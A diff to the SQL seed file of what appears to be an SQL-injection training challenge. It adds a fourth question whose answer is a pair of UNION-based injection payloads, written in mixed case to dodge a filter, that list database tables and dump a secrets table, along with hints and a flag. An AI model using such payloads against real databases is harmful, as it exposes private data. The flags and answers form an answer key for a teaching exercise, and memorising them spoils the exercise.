@@ -57,3 +57,25 @@ VALUES ('caitlin', 'verystrongpassword'), ('denton', 'HAHAHFDATHISISKILLINGME');
 -- q3 answer
 INSERT INTO q3secrets (flag)
 VALUES ('SQLI_GUIDE{F7AG_4_Q0ESTI0N_NUM_T3HEE}');
+
+-- q4 question
+INSERT INTO questions (id, query, answer, hints) 
+VALUES (
+    'q4', 
+    'SELECT name, age, dog_name FROM q4users WHERE name = ''$1'';',
+    'test'' uNION sELECT table_name, 1, ''test'' fROM INFORMATION_SCHEMA.TABLES wHERE table_type = ''BASE TABLE''; --
+    test'' uNION sELECT *, 1, ''test'' fROM secretsq4; --',
+    ARRAY [
+        'The first thing to do is find the table name of where the flag would be stored, check out: https://www.datameer.com/blog/sql_how-to-display-all-the-tables-from-a-database/', 
+        'Ensure the data types of columns in your UNION matches the data types in the original query.',
+        'Check your injected query. Is anything getting filtered out?'
+    ]
+);
+
+-- Inserting example users
+INSERT INTO q4users (age, dog_name, name)
+VALUES (1, 'spot', 'caitlin'), (5, 'spotty', 'denton');
+
+-- q4 answer
+INSERT INTO secretsq4 (flag)
+VALUES ('SQLI_GUIDE{T$IS_FDQAL#$_$Q4_FLJKDJFNB}');
